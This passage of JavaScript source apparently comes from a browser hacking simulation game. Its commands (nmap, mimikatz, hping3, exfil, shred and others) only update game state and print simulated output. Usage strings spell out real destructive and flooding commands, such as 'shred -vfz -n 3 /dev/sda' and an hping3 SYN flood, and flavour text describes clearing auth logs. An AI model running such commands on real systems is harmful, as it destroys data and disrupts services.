        const totalCost = inflatedPrice * qty;
        
        if (money < totalCost) return `[-] Insufficient funds. Need ₿${totalCost.toLocaleString()}. You have ₿${money.toLocaleString()}.`;
        
        setMoney(m => m - totalCost);
        setStash(prev => ({ ...prev, [itemKey]: (prev[itemKey] || 0) + qty }));
        let out = `[+] Purchased ${qty}x ${COMMODITIES[itemKey].name} for ₿${totalCost.toLocaleString()}.`;
        if (priceMult > 1) out += `\n[!] Heat surcharge: prices inflated ${Math.round((priceMult - 1) * 100)}% due to law enforcement attention.`;
        return out;
      },

      sell: async () => {
        if (isInside) return `[-] Cannot trade while inside a target.`;
        if (!arg1 || !args[2]) return `[-] Usage: sell <item> <qty>\n[*] Items: cc_dumps, botnets, exploits, zerodays`;
        const itemKey = arg1.toLowerCase();
        let qty = parseInt(args[2]);
        if (!COMMODITIES[itemKey]) return `[-] Unknown commodity: ${itemKey}`;
        
        if (args[2].toLowerCase() === 'all') {
            qty = stash[itemKey] || 0;
        }
        
        if (isNaN(qty) || qty <= 0) return `[-] Invalid quantity.`;
        if ((stash[itemKey] || 0) < qty) return `[-] Insufficient inventory. You only have ${stash[itemKey] || 0}.`;
        
        const pricePerUnit = marketPrices[itemKey];
        const totalProfit = pricePerUnit * qty;
        
        setMoney(m => m + totalProfit);
        setStash(prev => ({ ...prev, [itemKey]: prev[itemKey] - qty }));
        return `[+] Sold ${qty}x ${COMMODITIES[itemKey].name} for ₿${totalProfit.toLocaleString()}.`;
      },

     nmap: async () => {
        setMapExpanded(true);
        if (arg1) { if (world[arg1]) { selectNodeFromMap(arg1); return null; } return `nmap: host down.`; }
        
        let out = `Starting Nmap 7.93...\n`;
        if (isInside) {
          if (!proxies.includes(targetIP)) return `[-] Nmap failed. Establish a SOCKS5 tunnel first with 'chisel'.`;
          out += `\n[*] Routing through ${targetIP} proxy...\n[*] Scanning internal subnet...\n`;
          
          const newNode = generateNewTarget('elite', targetIP);
          
          // --- PERSISTENCE FIX: TAG HIDDEN NODE WITH CURRENT REGION ---
          newNode.data.region = currentRegion;

          setWorld(prev => ({ ...prev, [newNode.ip]: newNode.data }));
          out += `\n[+] HIDDEN NODE: ${newNode.data.port}/tcp on ${newNode.ip}\n[+] ORG: ${newNode.data.org.orgName}`;
          return out;
        }

        // --- PERSISTENCE FIX: FILTER CAPACITY BY CURRENT REGION ONLY ---
        // This lets you have 25 nodes PER region instead of 25 total.
        const regionalNodes = Object.keys(world || {}).filter(k => world[k].region === currentRegion && !world[k].isHidden).length;
        if (regionalNodes >= 25) {
            out += `\nSubnet scan capacity reached for ${currentRegion.toUpperCase()}. Type 'travel <region>' to find new targets.`;
            return out;
        }

        const scanCount = inventory.includes('NetCard') ? 2 : 1;
        
        for(let i = 0; i < scanCount; i++) {
          const currentTotal = Object.keys(world || {}).filter(k => world[k].region === currentRegion && !world[k].isHidden).length;
          if (currentTotal + i >= 25) break;
          
          const isFirstScan = (contracts.length === 0 && Object.keys(world).length <= 1); 
          const targetSec = isFirstScan ? 'low' : null; 
          
          const newNode = generateNewTarget(targetSec, null, director.modifiers);
          
          // --- PERSISTENCE FIX: TAG NEW NODE WITH CURRENT REGION ---
          newNode.data.region = currentRegion;

          if (reputation < 15) {
            newNode.data.isHoneypot = false;
          }

          // Use functional update to ensure we don't overwrite nodes from other regions
          setWorld(prev => ({ ...prev, [newNode.ip]: newNode.data }));

          out += `\nDiscovered ${newNode.data.port}/tcp on ${newNode.ip}`;
          out += `\n[*] ORG: ${newNode.data.org.orgName} (${newNode.data.org.type})`;
          out += `\n[*] EMPLOYEES: ${newNode.data.org.employees.length} found via OSINT\n`;
          
          if ((isFirstScan || Math.random() < 0.3) && contracts.length < 8) {
            out += `\n[FIXER] Signal intercepted. Negotiating custom darknet contract...`;
            
            generateAIContract(newNode.ip, newNode.data, reputation, apiKey).then(aiContract => {
              if (aiContract) {
                let adjustedRep = aiContract.repReward;
                let adjustedMoney = aiContract.reward;
                const completedCount = director.metrics.contractsCompleted || 0;
                
                if (completedCount <= 5) {
                    adjustedRep = Math.min(aiContract.repReward, 5);
                    adjustedMoney = Math.min(aiContract.reward, 1000);
                }

                const newContract = { 
                  id: `CTR-${Date.now().toString(36).toUpperCase()}`, 
                  targetIP: newNode.ip, 
                  targetName: newNode.data.org.orgName, 
                  startTime: null, 
                  active: false, 
                  completed: false, 
                  ...aiContract,
                  repReward: adjustedRep,
                  reward: adjustedMoney 
                };
                
                setContracts(prev => [...prev, newContract]);
                setTerminal(prev => [...prev, { type: 'out', text: `\n[FIXER] Contract ${newContract.id} ready. Type 'contracts' to view.`, isNew: true }]);
              }
            });
          }
        }
        return out;
      },
     ettercap: async () => {
        if (!isInside) return "[-] ettercap: Must be inside a target network to poison ARP tables.";
        
        // I have commented this out so you can actually test the command!
        // If you add Wireshark to the shop later, just remove the two slashes.
        // if (!inventory.includes('Wireshark')) return "[-] ettercap: Deep Packet Inspector module required. Purchase from 'shop'.";
        
        const node = world[targetIP];
        if (!node?.org) return "[-] ettercap: No hosts detected on local subnet.";
        if (node.commsGenerated) return "[-] ettercap: ARP cache already poisoned. Traffic captured in terminal history.";

        setIsProcessing(true);
        setTerminal(prev => [...prev, { type: 'out', text: `ettercap 0.8.3.1 (etter.conf)\n\nListening on ${targetIP}/eth0...\n\n  ${node.org.employees?.length || 3} hosts added to TARGET1\n  Gateway added to TARGET2\n\nARP poisoning victims:\n GROUP 1 : ANY (all the hosts in the list)\n GROUP 2 : ANY (all the hosts in the list)\n\nStarting Unified sniffing...\n[*] ARP cache poisoning in progress...\n[*] Capturing packets...`, isNew: false }]);

        const comms = await generateInterceptedComms(targetIP, node, apiKey);
        escalateBlueTeam(targetIP, 15);
        setTrace(t => Math.min(t + 10, 100));

        setWorld(prev => { const nw = { ...prev }; if (nw[targetIP]) nw[targetIP] = { ...nw[targetIP], commsGenerated: true }; return nw; });
        playSuccess();
        setIsProcessing(false);
        
        const contractMsg = verifyContract(targetIP, 'sniff');
        
        // NOTICE: ${contractMsg} is now attached to the very end of this string!
        return `[+] ettercap: MITM active. Sniffed ${node.org.employees?.length || 3} hosts.\n────────────────────────────────────\n${comms}\n────────────────────────────────────\n[!] Trace +10%. ARP anomalies may trigger IDS.${contractMsg}`;
      },

      sliver: async () => {
        if (!isInside) return "[-] Must be on a remote host.";
        if (privilege !== 'root') return "[-] Root required for C2 payload.";
        if (botnet.includes(targetIP)) return "[-] Beacon already active.";
        setBotnet(prev => [...prev, targetIP]);
        playBeacon();
        escalateBlueTeam(targetIP, 20);
        return `[*] Deploying sliver-agent.bin...\n[+] C2 beacon established. Node added to botnet.\n[*] BOTNET UTILITIES NOW AVAILABLE:\n    hping3 <ip>     - SYN flood to disrupt target defenses\n    mimikatz <ip>   - Dump LSASS credentials from C2 node\n    stash <file>    - Stage exfil data through botnet node\n    hashcat -d      - Distribute cracking across botnet`;
      },

      chisel: async () => {
        if (!isInside) return "[-] Must be on a remote host.";
        if (privilege !== 'root') return "[-] Root required for tunnel.";
        if (proxies.includes(targetIP)) return "[-] Tunnel already active.";
        const maxSlots = getMaxProxySlots(inventory, director.modifiers);
        if (proxies.length >= maxSlots) return `[-] Proxy chain at capacity (${maxSlots}/${maxSlots} hops). Use 'disconnect <ip>' to free a slot.`;
        setProxies(prev => [...prev, targetIP]);
        playSuccess();
        escalateBlueTeam(targetIP, 10);
        return `[*] Chisel reverse tunnel...\n[+] SOCKS5 proxy active. Hop ${proxies.length + 1}/${maxSlots}. Trace slowed. Pivoting enabled.`;
      },

      disconnect: async () => {
        if (!arg1) return "[-] Usage: disconnect <ip>\n[*] Removes a node from your proxy chain or botnet.";
        if (isInside && targetIP === arg1) return "[-] Cannot disconnect a node you're currently inside. Type 'exit' first.";
        const isProxy = proxies.includes(arg1);
        const isBotnet = botnet.includes(arg1);
        if (!isProxy && !isBotnet) return `[-] ${arg1} is not in your proxy chain or botnet.`;
        let out = '';
        if (isProxy) { setProxies(prev => prev.filter(ip => ip !== arg1)); out += `[*] Chisel tunnel on ${arg1} torn down. Proxy hop removed.\n`; }
        if (isBotnet) { setBotnet(prev => prev.filter(ip => ip !== arg1)); out += `[*] Sliver beacon on ${arg1} deactivated. Node removed from botnet.\n`; }
        const maxSlots = getMaxProxySlots(inventory, director.modifiers);
        const remaining = proxies.filter(ip => ip !== arg1).length;
        out += `[+] Done. Proxy chain: ${remaining}/${maxSlots} hops.`;
        return out;
      },

      hping3: async () => {
        if (isInside) return "[-] hping3: Must be run from KALI-GATEWAY. Type 'exit' first.";
        if (!arg1) return "[-] Usage: hping3 <target_ip> --flood -S -p 80\n[*] Coordinates SYN flood from botnet nodes to overwhelm target defenses.";
        if (botnet.length === 0) return "[-] hping3: No botnet nodes to source attack from. Deploy sliver beacons first.";
        const node = world[arg1];
        if (!node) return `[-] hping3: Host ${arg1} unreachable.`;
        if (botnet.includes(arg1)) return "[-] hping3: Cannot target your own infrastructure.";

        const power = botnet.length;
        const effectiveness = Math.min(power * 15, 80);
        const pps = power * 145000;

        setIsProcessing(true);
        setTerminal(prev => [...prev, { type: 'out', text: `HPING ${arg1} (eth0 ${arg1}): S set, 40 headers + 0 data bytes\n[*] Distributing attack across ${power} C2 node${power > 1 ? 's' : ''}...\n--- ${arg1} hping statistic ---\n${pps.toLocaleString()} packets transmitted, 0 packets received, 100% packet loss\nround-trip min/avg/max = 0.0/0.0/0.0 ms\n[*] SYN flood saturating target at ${(pps / 1000).toFixed(0)}k pps...`, isNew: false }]);

        await new Promise(r => setTimeout(r, 2000));

        setWorld(prev => {
          const nw = { ...prev };
          if (nw[arg1]?.blueTeam) {
            const newAlert = Math.max(nw[arg1].blueTeam.alertLevel - effectiveness, 0);
            nw[arg1] = { ...nw[arg1], blueTeam: { ...nw[arg1].blueTeam, alertLevel: newAlert, activeHunting: false } };
          }
          return nw;
        });

        setHeat(h => Math.min(h + 5, 100));
        playSuccess();
        setIsProcessing(false);

        let out = `[+] hping3 flood complete. ${effectiveness}% service disruption achieved on ${arg1}.\n[+] Target SOC overwhelmed — Blue Team alert level reduced.\n[!] Heat +5% (reflected traffic logged upstream).`;
        if (power >= 5) out += `\n[+] CRITICAL MASS: ${power}-node flood crashed their IDS/IPS entirely. Monitoring offline.`;
        return out;
      },

      mimikatz: async () => {
        if (isInside) return "[-] mimikatz: Run remotely via C2 beacon. Exit current session first.";
        if (!arg1) return "[-] Usage: mimikatz <botnet_ip>\n[*] Executes mimikatz on a C2 node to dump credentials from LSASS memory.";
        if (!botnet.includes(arg1)) return `[-] mimikatz: ${arg1} has no active C2 beacon.`;
        const node = world[arg1];
        if (!node) return `[-] mimikatz: Node ${arg1} no longer exists.`;

        const mzKey = `mimikatz_${arg1}`;
        if (looted.includes(mzKey)) return "[-] mimikatz: Credentials already extracted from this node. LSASS cache needs time to repopulate.";

        setIsProcessing(true);
        const mzBanner = "  .#####.   mimikatz 2.2.0 (x64) #19041\n .## ^ ##.  \"A La Vie, A L'Amour\" - (oe.eo)\n ## / \\ ##  /*** Benjamin DELPY (gentilkiwi) ***\n ## \\ / ##       > https://blog.gentilkiwi.com\n '## v ##'      with modules : * / **\n  '#####'       Kali Linux  " + arg1;
        setTerminal(prev => [...prev, { type: 'out', text: `${mzBanner}\n\nmimikatz # sekurlsa::logonpasswords\n[*] Tasking beacon on ${arg1}...\n[*] Dumping LSASS process memory...\n[*] Parsing credential structures...`, isNew: false }]);

        await new Promise(r => setTimeout(r, 2500));

        const org = node.org;
        let mzData = '';
        try {
          const response = await fetch(`https://generativelanguage.googleapis.com/v1beta/models/gemini-2.5-flash:generateContent?key=${apiKey}`, {
            method: 'POST', headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              systemInstruction: { parts: [{ text: `You generate mimikatz sekurlsa::logonpasswords output for a hacking game. The org is "${org?.orgName || 'Unknown'}". Employees: ${org?.employees?.map(e => e.name + ' (' + e.role + ', pwd: ' + e.password + ')').join('; ') || 'unknown'}. Generate mimikatz-style output showing 2-3 credential entries. Each entry must use this EXACT format:\nAuthentication Id : 0 ; XXXXX (00000000:0000XXXX)\nSession           : Interactive from 1\nUser Name         : firstname.lastname\nDomain            : ${(org?.orgName || 'CORP').split(' ')[0].toUpperCase()}\nLogon Server      : DC01\nSID               : S-1-5-21-XXXXXXXXXX\n  * Username : firstname.lastname\n  * Domain   : ${(org?.orgName || 'CORP').split(' ')[0].toUpperCase()}\n  * NTLM     : [random 32 char hex]\n  * Password : [use the actual password from the employee list]\nUse REAL employee names and passwords from the list. No markdown. No explanation.` }] },
              contents: [{ role: 'user', parts: [{ text: `Generate mimikatz output for ${org?.orgName || arg1}` }] }]
            })
          });
          const data = await response.json();
          mzData = data.candidates[0].content.parts[0].text;
        } catch (e) {
          const emp = org?.employees?.[0];
          const domain = (org?.orgName || 'CORP').split(' ')[0].toUpperCase();
          mzData = `Authentication Id : 0 ; 995312 (00000000:000F3070)\nSession           : Interactive from 1\nUser Name         : ${emp?.email || 'admin'}\nDomain            : ${domain}\nLogon Server      : DC01\n  * Username : ${emp?.email || 'admin'}\n  * Domain   : ${domain}\n  * NTLM     : 8846f7eaee8fb117ad06bdd830b7586c\n  * Password : ${emp?.password || 'P@ssw0rd1'}`;
        }

        const intelValue = Math.floor(Math.random() * 800 + 300);
        setMoney(m => m + intelValue);
        setLooted(prev => [...prev, mzKey]);
        playSuccess();
        setIsProcessing(false);

        return `${mzData}\n\nmimikatz # exit\n[+] ${org?.employees?.length || 2} credential sets extracted from LSASS.\n[+] Plaintext passwords + NTLM hashes sold for ₿${intelValue.toLocaleString()}.`;
      },

     exfil: async () => {
        try {
          if (!isInside) return "[-] Must be on a remote host.";
          if (!arg1) return "[-] Usage: exfil <filename>";
          const targetFile = resolvePath(arg1, currentDir);
          let rawData = contents[targetFile] || contents[arg1];
          if (!rawData) return `[-] exfil: ${arg1}: File not found`;
          const val = getEconomyPayout({ action: 'exfil' });
          if (!val || val <= 0) return "[-] No extractable assets.";
          const fileKey = `${targetIP}:${targetFile}`;
          if (looted.includes(fileKey)) return "[-] Already exfiltrated.";
          
          setIsProcessing(true);
          setTerminal(prev => [...prev, { type: 'out', text: `[*] Initiating encrypted SOCKS5 transfer...`, isNew: false }]);
          await new Promise(r => setTimeout(r, 2000));
          
          setMoney(m => m + val);
          setHeat(h => Math.min(h + 10, 100));
          setTrace(t => Math.min(t + 25, 100));
          setLooted(prev => [...prev, fileKey, targetIP]);
          escalateBlueTeam(targetIP, 30);
          trackLoot(val);
          playExfil();

          // --- BULLETPROOF CONTRACT CHECK (MOVED TO END) ---
          let contractMsg = '';
          const currentContract = contracts.find(c => c.active && !c.completed);
          if (currentContract) {
            const isExfil = currentContract.objectives?.some(o => o.ip === targetIP && o.type === 'exfil');
            if (isExfil) {
              const timeTaken = (Date.now() - currentContract.startTime) / 1000;
              const rewardVal = currentContract.reward || 0;
              const repVal = currentContract.repReward || 0;
              
              if (timeTaken <= (currentContract.timeLimit || 9999) && heat <= (currentContract.heatCap || 100)) {
                setMoney(m => m + rewardVal);
                setReputation(r => r + repVal);
                completeContractAndRemove(currentContract.id); trackContract(true);
                contractMsg = `\n\n[FIXER] CONTRACT FULFILLED.\n[+] BONUS: ₿${rewardVal.toLocaleString()} + ${repVal} REP`;
              } else {
                completeContractAndRemove(currentContract.id); trackContract(false);
                contractMsg = `\n\n[FIXER] CONTRACT FAILED. Time Limit or Heat Cap exceeded.`;
              }
            }
          }

          setIsProcessing(false);
          return `[+] EXFIL COMPLETE. ₿${val.toLocaleString()} secured.\n[!] Trace +25%, Heat +10%.${contractMsg}`;
        } catch (err) {
          setIsProcessing(false);
          return `[-] CRITICAL ERROR in exfil module: ${err.message}`;
        }
      },

      download: async () => {
        if (!isInside) return "[-] Must be on a remote host.";
        if (!arg1) return "[-] Usage: download <filename>";
        
        const isConsumable = ['decoy.bin', 'burner.ovpn', '0day_poc.sh', 'wallet.dat'].includes(arg1);
        if (isConsumable) {
          const currentDirFiles = fs[currentDir] || [];
          if (!currentDirFiles.includes(arg1)) return `download: ${arg1}: No such file`;
          
          setWorld(prev => {
            const nw = { ...prev };
            const targetNode = isInside ? targetIP : 'local';
            nw[targetNode].files[currentDir] = nw[targetNode].files[currentDir].filter(f => f !== arg1);
            return nw;
          });

          if (arg1 === 'wallet.dat') {
            const amt = Math.floor(Math.random() * 800 + 200);
            setMoney(m => m + amt);
            playSuccess();
            return `[+] SUCCESS: Decrypted slush fund wallet.\n[+] ₿${amt.toLocaleString()} added to your account.`;
          } else if (arg1 === 'decoy.bin') {
            setConsumables(c => ({ ...c, decoy: c.decoy + 1 }));
            playSuccess();
            return `[+] SUCCESS: Recovered Trace Decoy!\n[*] Type 'use decoy' during a hack to reduce Trace by 30%.`;
          } else if (arg1 === 'burner.ovpn') {
            setConsumables(c => ({ ...c, burner: c.burner + 1 }));
            playSuccess();
            return `[+] SUCCESS: Recovered Burner VPN Cert!\n[*] Type 'use burner' to reduce global Heat by 25%.`;
          } else if (arg1 === '0day_poc.sh') {
            setConsumables(c => ({ ...c, zeroday: c.zeroday + 1 }));
            playSuccess();
            return `[+] SUCCESS: Recovered Zero-Day Exploit!\n[*] Type 'use 0day' during a hack for instant root access.`;
          }
        }

        const targetFile = resolvePath(arg1, currentDir);
        let rawData = contents[targetFile] || contents[arg1];
        if (!rawData) return `[-] download: ${arg1}: File not found`;
        if (rawData.startsWith('[LOCKED]')) {
          if (privilege !== 'root') return `[-] Permission denied.`;
          rawData = rawData.replace('[LOCKED] ', '');
        }
        setWorld(prev => {
          const nw = { ...prev };
          if (!nw.local.files['/home/operator'].includes(arg1)) nw.local.files['/home/operator'] = [...nw.local.files['/home/operator'], arg1];
          nw.local.contents = { ...nw.local.contents, [`/home/operator/${arg1}`]: rawData };
          return nw;
        });
        playSuccess();
        return `[+] ${arg1} saved to /home/operator/`;
      },

      john: async () => {
        if (isInside) return "[-] john: Must be run locally from KALI-GATEWAY.";
        if (!arg1) return "[-] Usage: john <filename>\n[*] Example: john sys.hashes --wordlist=rockyou.txt";

        const targetFile = resolvePath(arg1, currentDir);
        let rawData = world.local.contents[targetFile];
        if (!rawData) return `[-] john: ${arg1}: No such file on local drive. Did you download it?`;
        if (!rawData.includes('[HASH]')) return "[-] john: No recognizable hashes in file.";
        
        const hashKey = `john_${arg1}`;
        if (looted.includes(hashKey)) return "[-] john: Hashes already cracked in previous session.";

        const ipMatch = rawData.match(/ORIGIN_IP:(\d+\.\d+\.\d+\.\d+)/);
        const sourceIP = ipMatch ? ipMatch[1] : null;
        const orgData = sourceIP ? world[sourceIP]?.org : null;

        const hasCPU = inventory.includes('CPU');
        const crackTime = Math.max(900, Math.floor((hasCPU ? 2400 : 3600) / getHashRigMult()));
        const baseReward = getEconomyPayout({ ip: sourceIP || targetIP, action: 'john' });

        setIsProcessing(true);
        setTerminal(prev => [...prev, { 
          type: 'out', 
          text: `[*] John the Ripper 1.9.0-jumbo-1 (CPU Optimized)\n[*] Loaded 14 password hashes with 14 different salts\n[*] Hardware detected: ${hasCPU ? 'Quantum Thread Ripper [ACCELERATED]' : 'Standard CPU'}\n[*] Press 'q' or Ctrl-C to abort, almost any other key for status\n[*] Initiating Wordlist + Mangling Rules attack...`, 
          isNew: false 
        }]);
        
        await new Promise(r => setTimeout(r, crackTime));

        setMoney(m => m + baseReward);
        setLooted(prev => [...prev, hashKey]);
        playSuccess();
        setIsProcessing(false);

        let out = `[+] Session complete. 14 hashes cracked.`;
        if (orgData && orgData.employees) {
          out += `\n[+] Decrypted core credentials for ${orgData.orgName}:`;
          orgData.employees.forEach(emp => {
            out += `\n    ${emp.email}@${sourceIP} : ${emp.password}`;
          });
          out += `\n\n[+] Additional off-book hashes fenced for ₿${baseReward.toLocaleString()}.`;
          out += `\n[*] TIP: Use these credentials with the 'ssh' command to bypass intrusion detection.`;
        } else {
           out += `\n[+] Credentials fenced on the black market for ₿${baseReward.toLocaleString()}.`;
        }
        return out;
      },

      hashcat: async () => {
        if (isInside) return "[-] Return to KALI-GATEWAY for cracking.";
        if (!arg1) return "[-] Usage: hashcat <filename>\n[*] Use 'hashcat -d <filename>' for distributed cracking across botnet nodes.";

        const distributed = arg1 === '-d';
        const filename = distributed ? (args[2] || null) : arg1;
        if (!filename) return "[-] Usage: hashcat -d <filename>";

        const targetFile = resolvePath(filename, currentDir);
        let rawData = world.local.contents[targetFile];
        if (!rawData) return `[-] hashcat: ${filename}: Not found locally.`;
        if (!rawData.includes('[HASH]')) return "[-] No recognizable hashes.";
        const hashKey = `hash_${filename}`;
        if (looted.includes(hashKey)) return "[-] Already cracked.";

        if (distributed && botnet.length === 0) return "[-] No botnet nodes for distributed cracking. Deploy sliver beacons.";

        const nodeCount = distributed ? botnet.length : 0;
        const speedMult = distributed ? Math.max(1, nodeCount) : 1;
        
        const baseCrackTime = Math.max(700, Math.floor(3200 / (speedMult * getHashRigMult())));
        let crackTime = inventory.includes('CPU') ? Math.floor(baseCrackTime * 0.7) : baseCrackTime;
        if (inventory.includes('GPU')) crackTime = Math.max(250, Math.floor(baseCrackTime * 0.35));
        
        const totalReward = getEconomyPayout({ action: 'hashcat', distributedNodes: nodeCount });
        const baseReward = Math.floor(totalReward / (distributed ? (1 + (nodeCount * 0.08)) : 1));
        const bonusReward = totalReward - baseReward;

        setIsProcessing(true);
        if (distributed) {
          setTerminal(prev => [...prev, { type: 'out', text: `[*] hashcat v6.2.6 — DISTRIBUTED MODE\n[*] Farming workload across ${nodeCount} botnet node${nodeCount > 1 ? 's' : ''}...\n[*] Loading rockyou.txt + leaked-passwords-10M.txt...\n[*] Combined hashrate: ${(nodeCount * 2.4).toFixed(1)} GH/s`, isNew: false }]);
        } else {
          setTerminal(prev => [...prev, { type: 'out', text: `[*] hashcat v6.2.6...\n[*] Loading rockyou.txt...\n[*] Local GPU: 2.4 GH/s`, isNew: false }]);
        }

        await new Promise(r => setTimeout(r, crackTime));

        const credCount = distributed ? 4201 + (nodeCount * 1200) : 4201;
        setMoney(m => m + totalReward);
        setLooted(prev => [...prev, hashKey]);
        playSuccess();
        setIsProcessing(false);

        let out = `[+] CRACKING COMPLETE. ${credCount.toLocaleString()} credentials recovered.`;
        if (distributed) {
          out += `\n[+] Distributed bonus: ${nodeCount} nodes contributed ${(nodeCount * 2.4).toFixed(1)} GH/s extra.`;
          out += `\n[+] Premium credentials sold for ₿${totalReward.toLocaleString()} (₿${baseReward.toLocaleString()} base + ₿${bonusReward.toLocaleString()} distributed bonus).`;
        } else {
          out += `\n[+] Credentials sold for ₿${totalReward.toLocaleString()}.`;
          if (botnet.length > 0) out += `\n[*] TIP: Use 'hashcat -d ${filename}' to distribute across your ${botnet.length} botnet nodes for faster cracking and bonus payout.`;
        }
        return out;
      },
resolve: async (args) => {
  // 1. Check if a story is actually active in state
  if (!activeStory) {
    return "[-] No active intercept found. You must 'cat' a Story Trigger file first (e.g., .rec, .enc, or .mbox).";
  }

  const choice = args[1]; // Get the '1' or '2' from the command
  if (choice !== '1' && choice !== '2') {
    return "[-] Usage: resolve [1 or 2]";
  }

  if (choice === '1') {
    // --- SIGNAL PATH (The "Good" Choice) ---
    setMorality(prev => ({
      ...prev,
      signal: prev.signal + 10
    }));

    // Use the payout from the story generator, or fall back to 5k
    const payout = activeStory.good_payout || 5000;
    setMoney(m => m + payout);
    
    // Clear the story so it can't be spammed
    const actionResult = activeStory.good_action;
    setActiveStory(null); 

    return `[+] ${actionResult}\n[+] SIGNAL +10 | ₿${payout.toLocaleString()} credits transferred.`;
  }

  if (choice === '2') {
    // --- CHAOS PATH (The "Evil" Choice) ---
    setMorality(prev => ({
      ...prev,
      chaos: prev.chaos + 10
    }));

    // Chaos usually pays better in cyberpunk—it's high risk, high reward
    const payout = activeStory.evil_payout || 25000;
    setMoney(m => m + payout);
    
    const actionResult = activeStory.evil_action;
    setActiveStory(null);

    return `[+] ${actionResult}\n[+] CHAOS +10 | ₿${payout.toLocaleString()} credits laundered.`;
  }
},
      stash: async () => {
        if (!isInside) return "[-] Must be on a remote host to stage data.";
        if (!arg1) return "[-] Usage: stash <filename>\n[*] Routes exfiltrated data through a botnet node instead of direct to gateway.\n[*] Reduces heat from exfil but requires an active botnet node.";
        if (botnet.length === 0) return "[-] No botnet nodes available for staging. Deploy sliver beacons first.";

        const targetFile = resolvePath(arg1, currentDir);
        let rawData = contents[targetFile] || contents[arg1];
        if (!rawData) return `[-] stash: ${arg1}: File not found`;

        const val = getEconomyPayout({ action: 'stash', staged: true });
        if (!val || val <= 0) return "[-] No extractable financial assets found.";

        const fileKey = `${targetIP}:${targetFile}`;
        if (looted.includes(fileKey)) return "[-] Data already exfiltrated.";

        const stagingNode = botnet.filter(ip => ip !== targetIP)[0] || botnet[0];
        const stagingName = world[stagingNode]?.org?.orgName || stagingNode;

        setIsProcessing(true);
        setTerminal(prev => [...prev, { type: 'out', text: `[*] Routing exfil through staging node: ${stagingNode} (${stagingName})...\n[*] Encrypting payload with AES-256...\n[*] Fragmenting across ${Math.min(botnet.length, 3)} relay nodes...`, isNew: false }]);

        await new Promise(r => setTimeout(r, 2500));

        setMoney(m => m + val);
        setHeat(h => Math.min(h + 3, 100));
        setTrace(t => Math.min(t + 8, 100));
        setLooted(prev => [...prev, fileKey, targetIP]);
        escalateBlueTeam(targetIP, 15);
        trackLoot(val);
        playExfil();

        if (activeContract?.type === 'exfil' && activeContract.targetIP === targetIP) {
          const timeTaken = (Date.now() - activeContract.startTime) / 1000;
          if (timeTaken <= activeContract.timeLimit && heat <= activeContract.heatCap) {
            setMoney(m => m + activeContract.reward);
            setReputation(r => r + activeContract.repReward);
            setContracts(prev => prev.map(c => c.id === activeContract.id ? { ...c, completed: true, active: false } : c));
            setActiveContract(null); trackContract(true); setIsProcessing(false);
            return `[+] STASH EXFIL COMPLETE via ${stagingName}. ₿${val.toLocaleString()} secured.\n[+] Trace +8%, Heat +3% (staged routing).\n\n[FIXER] CONTRACT ${activeContract.id} FULFILLED.\n[+] BONUS: ₿${activeContract.reward.toLocaleString()} + ${activeContract.repReward} REP`;
          }
        }

        setIsProcessing(false);
        return `[+] STASH EXFIL COMPLETE via ${stagingName}.\n[+] ₿${val.toLocaleString()} secured.\n[+] Trace +8%, Heat +3% (staged routing vs +25/+10 direct).`;
      },

      wipe: async () => {
        if (!isInside) return "[-] Must be on a remote host.";
        if (privilege !== 'root') return "[-] Root required.";
        if (wipedNodes.includes(targetIP)) return "[-] Logs already sanitized on this node.";
        setIsProcessing(true);
        setTerminal(prev => [...prev, { type: 'out', text: `[*] Overwriting /var/log/auth.log...\n[*] Clearing bash_history...\n[*] Scrubbing IDS alerts...`, isNew: false }]);
        await new Promise(r => setTimeout(r, 1500));
        setHeat(h => Math.max(h - 15, 0));
        setWipedNodes(prev => [...prev, targetIP]);
        setWorld(prev => {
          const nw = { ...prev };
          if (nw[targetIP]?.blueTeam) { nw[targetIP] = { ...nw[targetIP], blueTeam: { ...nw[targetIP].blueTeam, alertLevel: Math.max(nw[targetIP].blueTeam.alertLevel - 30, 0) } }; }
          return nw;
        });
        playDestroy();
        setIsProcessing(false);
        return `[+] Logs sanitized. HEAT -15%.`;
      },

      shred: async () => {
        try {
          const mult = getRewardMult(gameMode);
          
          // Helper function for contract check to avoid repeating code
          const processContractDestruction = () => {
            let msg = '';
            const currentContract = contracts.find(c => c.active && !c.completed);
            if (currentContract) {
              const isDest = currentContract.objectives?.some(o => o.ip === targetIP && o.type === 'destroy');
              if (isDest) {
                const timeTaken = (Date.now() - currentContract.startTime) / 1000;
                const rewardVal = currentContract.reward || 0;
                const repVal = currentContract.repReward || 0;
                
                if (timeTaken <= (currentContract.timeLimit || 9999) && heat <= (currentContract.heatCap || 100)) {
                  setMoney(m => m + rewardVal);
                  setReputation(r => r + repVal);
                  completeContractAndRemove(currentContract.id); trackContract(true);
                  msg = `\n\n[FIXER] CONTRACT FULFILLED.\n[+] BONUS: ₿${rewardVal.toLocaleString()} + ${repVal} REP`;
                } else {
                  completeContractAndRemove(currentContract.id); trackContract(false);
                  msg = `\n\n[FIXER] CONTRACT FAILED. Time Limit or Heat Cap exceeded.`;
                }
              }
            }
            return msg;
          };
          
          if (gameMode === 'operator') {
            const hasFlags = args.includes('-vfz') || (args.includes('-v') && args.includes('-f') && args.includes('-z'));
            const hasTarget = args.some(a => a.startsWith('/dev/'));
            if (!isInside) return "[-] shred: Must be executed on a remote host with root access.";
            if (privilege !== 'root') return "[-] shred: Operation not permitted.";
            if (!hasFlags || !hasTarget) return `[-] shred: Invalid syntax.\n[*] Usage: shred -vfz -n 3 /dev/sda`;
            const passes = args.find(a => a === '-n') ? parseInt(args[args.indexOf('-n') + 1]) || 3 : 3;
            
            setIsProcessing(true);
            for (let i = 1; i <= passes; i++) {
              setTerminal(prev => [...prev, { type: 'out', text: `shred: /dev/sda: pass ${i}/${passes} (random)...`, isNew: false }]);
              await new Promise(r => setTimeout(r, 1500));
            }
            setTerminal(prev => [...prev, { type: 'out', text: `shred: /dev/sda: pass ${passes + 1}/${passes + 1} (000000)...`, isNew: false }]);
            await new Promise(r => setTimeout(r, 1000));
            
            const bounty = 0;
            setMoney(m => m + bounty);
            setHeat(h => Math.min(h + 25, 100));
            setBotnet(prev => prev.filter(ip => ip !== targetIP));
            setProxies(prev => prev.filter(ip => ip !== targetIP));
            
            const contractMsg = processContractDestruction(); // Call check AFTER destruction
            
            setIsInside(false); setTargetIP(null); setCurrentDir('~'); setPrivilege('local');
            setWorld(prev => { const nw = { ...prev }; delete nw[targetIP]; return nw; });
            playDestroy();
            setIsProcessing(false);
            return `[+] DISK DESTROYED: ${destroyedName}\n[!] Node permanently wiped from the grid. Heat +20%.`;
          }
          
          if (gameMode === 'field') {
